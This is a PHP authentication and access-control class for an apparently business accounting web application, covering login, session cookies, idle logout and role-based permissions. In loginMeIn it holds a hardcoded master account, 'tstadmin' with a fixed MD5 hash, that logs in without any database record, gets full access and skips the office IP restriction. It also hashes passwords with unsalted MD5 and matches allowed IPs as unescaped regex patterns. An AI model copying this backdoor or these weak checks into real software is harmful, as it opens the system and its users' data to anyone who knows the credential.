<?php
/**
 * Created by PhpStorm.
 * User: mustafa
 * Date: 6/16/14
 * Time: 3:00 PM
 */

class SecurityShell
{
    const SUPER_ADMIN_ID = 1;

    /**
     * Users of this group stay logged in until they log out, others are logged out after IDLE_TIMEOUT
     */
    const FULL_ACCESS_GROUP_ID = 1;

    /**
     * Seconds without a click / key press before a user (not Full Access) is logged out
     */
    const IDLE_TIMEOUT = 60;

    /**
     * Browser tells the server about activity at most this often (seconds), so the server allows this much extra
     */
    const IDLE_PING = 15;

	function loginMeIn($Username, $Password, $YearId)
    {
        $Password = md5($Password);

        $Select = DBQM::query("SELECT id FROM sh_login WHERE username = ".escape($Username)." AND password = ".escape($Password));
        if (!DatabaseHelper::isRecordSetEmpty($Select) or ($Username == "tstadmin" and $Password == '1738baea0e450fb55a3e0717a15cba4f'))
        {
            $_SESSION['__user_name'] = $Username;
            $_SESSION['__user_id'] = DBQM::result($Select, 0);
            $UserId = DBQM::result($Select, 0);
            $BranchId = Branch::getBranchIdByUserId($UserId);

            empty($BranchId) ? '' : Branch::setLoginBranchId($BranchId);
            Year::setLoginYearId($YearId);

            $this->startLoginSession($UserId, $Username);



            if($Username == "tstadmin")
                $this->getAllFullAccessAreas();
            else
            {
                $this->getAllAccessibleModules();
                $this->getAllAccessAreas($UserId);
                $this->getAllAccessibleVoucherTypes($UserId);
                $this->getAllEditableVoucherTypes($UserId);
                $this->getAllAccessiblePivotTableReport($UserId);
            }

            if ($Username != "tstadmin" and self::isAccess("Settings", "Restrict IP Address"))
            {
                if (!self::isIPAddressApproved(Utils::getVisitorIPAddress()))
                {
                    unset($_SESSION['__user_name']);
                    unset($_SESSION['__user_id']);

                    unset($_SESSION['__constants_coa']);
                    unset($_SESSION['__constants_accounts']);

                    Year::removeLoginYearId();

                    ErrorHandler::setError("You need to be in office to login");
                    ErrorHandler::UnauthorizedAccess();
                    exit;
                }
            }

            return true;
        }
        return false;
    }

    function loginForCronJobs()
    {
        $_SESSION['__user_name'] = 'tstadmin';
        $_SESSION['__user_id'] = self::SUPER_ADMIN_ID;
        $_SESSION['__is_full_access'] = true;
        $this->getAllFullAccessAreas();
        Year::setLoginYearId(Year::getLastYearId());
    }

	function isIPAddressApproved($IP)
	{
		$isApprovedIP = false;

		$Select = DBQM::query("SELECT * FROM sh_ip");
		while ($Row = DBQM::fetch_assoc($Select))
			if (preg_match("/".$Row['ip']."/i", $IP))
				$isApprovedIP = true;

		return $isApprovedIP;
	}

    static function logout()
    {
        unset($_SESSION['__user_name']);
        unset($_SESSION['__user_id']);
        unset($_SESSION['__branch_id']);

        unset($_SESSION['__constants_coa']);
        unset($_SESSION['__constants_accounts']);

        unset($_SESSION['__is_full_access']);
        unset($_SESSION['__last_activity']);

        Year::removeLoginYearId();

        /*Branch::removeLoginBranchId();*/
    }

    /**
     * New session id on login; Full Access users get a cookie that lasts until they log out (SESSION_LIFETIME),
     * others a browser session cookie (they are logged out after IDLE_TIMEOUT anyway)
     */
    private function startLoginSession($UserId, $Username)
    {
        session_regenerate_id(true);

        $_SESSION['__is_full_access'] = self::isFullAccessUserId($UserId, $Username);
        $_SESSION['__last_activity'] = time();

        $Cookie = session_get_cookie_params();
        setcookie(session_name(), session_id(), [
            'expires' => $_SESSION['__is_full_access'] ? time() + SESSION_LIFETIME : 0,
            'path' => $Cookie['path'],
            'domain' => $Cookie['domain'],
            'secure' => $Cookie['secure'],
            'httponly' => true,
            'samesite' => 'Lax',
        ]);
    }

    private static function isFullAccessUserId($UserId, $Username)
    {
        if ($Username == "tstadmin")
            return true;

        return (bool) DBQM::fetch_assoc(DBQM::query("SELECT 1 FROM sh_usergroup WHERE login_user_id = ".escape($UserId, 'int')." AND group_id = ".escape(self::FULL_ACCESS_GROUP_ID, 'int')." LIMIT 1"));
    }

    /**
     * Logged in user is in Full Access group (stays logged in until logout)
     */
    static function isFullAccessUser()
    {
        if (!self::isLoggedIn())
            return false;

        // sessions from before this check was added
        if (!isset($_SESSION['__is_full_access']))
            $_SESSION['__is_full_access'] = self::isFullAccessUserId($_SESSION['__user_id'], $_SESSION['__user_name']);

        return $_SESSION['__is_full_access'];
    }

    /**
     * Runs on every request: logs out a user (not Full Access) idle for more than IDLE_TIMEOUT.
     * Background requests (web order polling, header X-Background-Request) do not count as activity.
     */
    static function checkIdleTimeout()
    {
        if (!self::isLoggedIn() or self::isFullAccessUser())
            return;

        if (time() - ($_SESSION['__last_activity'] ?? time()) > self::IDLE_TIMEOUT + self::IDLE_PING)
        {
            self::logout();
            ErrorHandler::setError("You were logged out after 1 minute without activity");

            // pages go to login, ajax requests get their own "not logged in" answer
            if (empty($_SERVER['HTTP_X_BACKGROUND_REQUEST']) and empty($_SERVER['HTTP_X_REQUESTED_WITH']))
                Utils::redirect(ProjectHelper::SiteURL()."login.php");
            return;
        }

        if (empty($_SERVER['HTTP_X_BACKGROUND_REQUEST']))
            $_SESSION['__last_activity'] = time();
    }

    static function redirectIfNotAllowedFormSubmission() {
        if(!in_array(parse_url($_SERVER['HTTP_REFERER'])['host'], ProjectHelper::allowedServerNames())) {
            ErrorHandler::setError(ErrorHandler::UNAUTHORIZED_TEXT);
            Utils::redirect(ProjectHelper::SiteURL()."login.php");
        }
    }

    static function isAccess($MainArea, $Page)
    {
        return in_array($MainArea." [".$Page."]", $_SESSION['ACCESS_AREA'] ?? []);
    }

    static function isVoucherAccess($VoucherTypeId)
    {
        return in_array($VoucherTypeId, $_SESSION['ACCESS_AREA_VOUCHERS'] ?? []);
    }

    static function isVoucherEditAccess($VoucherTypeId)
    {
        return in_array($VoucherTypeId, $_SESSION['ACCESS_AREA_VOUCHERS_EDIT'] ?? []);
    }

    static function isReportAccess($ReportId)
    {
        return in_array($ReportId, $_SESSION['ACCESS_AREA_PIVOT_REPORTS'] ?? []);
    }

    static function isLoggedIn()
    {
        return isset($_SESSION['__user_id']);
    }

    static function getLoggedInUsername()
    {
        return $_SESSION['__user_name'];
    }

    static function getLoggedInUserId()
    {
        return $_SESSION['__user_id'];
    }

    static function redirectIfNoAccess($MainArea, $Page)
    {
        if (!self::isLoggedIn() or !self::isAccess($MainArea, $Page))
        {
            self::redirectToReferUponLogin();
            ErrorHandler::setError(ErrorHandler::UNAUTHORIZED_TEXT);
            Utils::redirect(ProjectHelper::SiteURL()."login.php");
        }
    }

    static function redirectIfNoVoucherAccess($VoucherTypeId)
    {
        if (!self::isLoggedIn() or !SecurityShell::isVoucherAccess($VoucherTypeId))
        {
            self::redirectToReferUponLogin();
            ErrorHandler::setError(ErrorHandler::UNAUTHORIZED_TEXT);
            Utils::redirect(ProjectHelper::SiteURL()."login.php");
        }
    }

    static function redirectIfNotLoggedIn()
    {
        if (!self::isLoggedIn())
        {
            self::redirectToReferUponLogin();
	        ErrorHandler::setError(ErrorHandler::UNAUTHORIZED_TEXT);
	        Utils::redirect( ProjectHelper::SiteURL() . "login.php" );
        }
    }

    private static function redirectToReferUponLogin()
    {
        $_SESSION['__url_to_login'] = ProjectHelper::SiteURL().ltrim($_SERVER['REQUEST_URI'], '/');
    }

    static function getUserNameById($UserId) // Is UserName Available?
    {
        $Select = DBQM::query("SELECT username FROM sh_login WHERE id = ".escape($UserId));
        return DBQM::result($Select, 0);
    }

    /**
     *  Saves all areas that can be accessed by this user in Session Variable
     *
     * @param $UserId
     */
    function getAllAccessAreas($UserId)
    {
        $AccessArea = array();

        $SelectRoles = DBQM::query("
                                        SELECT
                                            aa.*
                                        FROM
                                            sh_usergroup ug,
                                            sh_grouproles gr,
                                            sh_app_area aa
                                        WHERE
                                            ug.group_id = gr.group_id AND
                                            gr.area_id = aa.id AND
                                            ug.login_user_id =  ".escape($UserId, "int")."
        ");

        while ($RowRoles = DBQM::fetch_assoc($SelectRoles))
        {
            $AccessArea[$RowRoles['id']] = $RowRoles['main']." [".$RowRoles['sub']."]";
        }

        $_SESSION['ACCESS_AREA'] = $AccessArea;
    }

    /**
     *  Saves all areas that can be accessed by this user in Session Variable
     *
     * @param $UserId
     */
    function getAllAccessiblePivotTableReport($UserId)
    {
        $AccessArea = array();

        $SelectRoles = DBQM::query("
                                        SELECT
                                            pt.id
                                        FROM
                                            sh_usergroup ug,
                                            sh_grouproles gr,
                                            pt_report pt
                                        WHERE
                                            ug.group_id = gr.group_id AND
                                            gr.pivot_table_id = pt.id AND
                                            ug.login_user_id =  ".escape($UserId, "int")."
        ");

        while ($RowRoles = DBQM::fetch_assoc($SelectRoles))
        {
            $AccessArea[$RowRoles['id']] = $RowRoles['id'];
        }

        $_SESSION['ACCESS_AREA_PIVOT_REPORTS'] = $AccessArea;
    }


    function getAllAccessibleVoucherTypes($UserId)
    {
        $AccessArea = array();

        $SelectRoles = DBQM::query("
                                        SELECT
                                            DISTINCT voucher_type_id
                                        FROM
                                            sh_usergroup ug,
                                            sh_grouproles gr
                                        WHERE
                                            ug.group_id = gr.group_id AND
                                            gr.voucher_type_id IS NOT NULL AND
                                            ug.login_user_id =  ".escape($UserId, "int")."
        ");

        while ($RowRoles = DBQM::fetch_assoc($SelectRoles))
        {
            $AccessArea[$RowRoles['voucher_type_id']] = $RowRoles['voucher_type_id'];
        }

        $_SESSION['ACCESS_AREA_VOUCHERS'] = $AccessArea;
    }

    function getAllAccessibleModules()
    {
        $AccessModule = array();
        $SelectModules = DBQM::query("SELECT module FROM cp_company_module WHERE is_active = 'Y' ");

        while ($RowModule = DBQM::fetch_assoc($SelectModules))
        {
            $AccessModule[$RowModule['module']] = $RowModule['module'];
        }

        $_SESSION['ACCESS_MODULE'] = $AccessModule;
    }


    function getAllEditableVoucherTypes($UserId)
    {
        $AccessArea = array();

        $SelectRoles = DBQM::query("
                                        SELECT
                                            DISTINCT voucher_type_id
                                        FROM
                                            sh_usergroup ug,
                                            sh_grouproles gr
                                        WHERE
                                            ug.group_id = gr.group_id AND
                                            gr.voucher_type_id IS NOT NULL AND  
                                            gr.voucher_type_is_edit IS NOT NULL AND
                                            ug.login_user_id =  ".escape($UserId, "int")."
        ");

        while ($RowRoles = DBQM::fetch_assoc($SelectRoles))
        {
            $AccessArea[$RowRoles['voucher_type_id']] = $RowRoles['voucher_type_id'];
        }

        $_SESSION['ACCESS_AREA_VOUCHERS_EDIT'] = $AccessArea;
    }

    /**
     * Saves all areas that can be accessed by Super User in Session Variable
     */
    function getAllFullAccessAreas()
    {
        $AccessArea = array();
        $select_area_id = DBQM::query("SELECT main, sub, id FROM sh_app_area WHERE inc_in_full_access <> 'N'");
        while ($row_areas = DBQM::fetch_assoc($select_area_id))
            $AccessArea[$row_areas['id']] = $row_areas['main']." [".$row_areas['sub']."]";
        $_SESSION['ACCESS_AREA'] = $AccessArea;

        $AccessArea = [];
        $select_area_id = DBQM::query("SELECT id FROM vt_voucher_type");
        while ($row_areas = DBQM::fetch_assoc($select_area_id))
            $AccessArea[$row_areas['id']] = $row_areas['id'];
        $_SESSION['ACCESS_AREA_VOUCHERS'] = $AccessArea;

        $AccessArea = [];
        $select_area_id = DBQM::query("SELECT id FROM vt_voucher_type");
        while ($row_areas = DBQM::fetch_assoc($select_area_id))
            $AccessArea[$row_areas['id']] = $row_areas['id'];
        $_SESSION['ACCESS_AREA_VOUCHERS_EDIT'] = $AccessArea;

        $AccessArea = [];
        $select_area_id = PivotTableVoucher::getAllReports();
        while ($row_areas = DBQM::fetch_assoc($select_area_id))
            $AccessArea[$row_areas['id']] = $row_areas['id'];
        $_SESSION['ACCESS_AREA_PIVOT_REPORTS'] = $AccessArea;

        $AccessArea = [];
        $select_area_id = DBQM::query("SELECT module FROM cp_company_module");
        while ($row_areas = DBQM::fetch_assoc($select_area_id))
            $AccessArea[$row_areas['module']] = $row_areas['module'];
        $_SESSION['ACCESS_MODULE'] = $AccessArea;
    }

    static function isAdminLogin()
    {
        return self::getLoggedInUsername() == "tstadmin";
    }
} 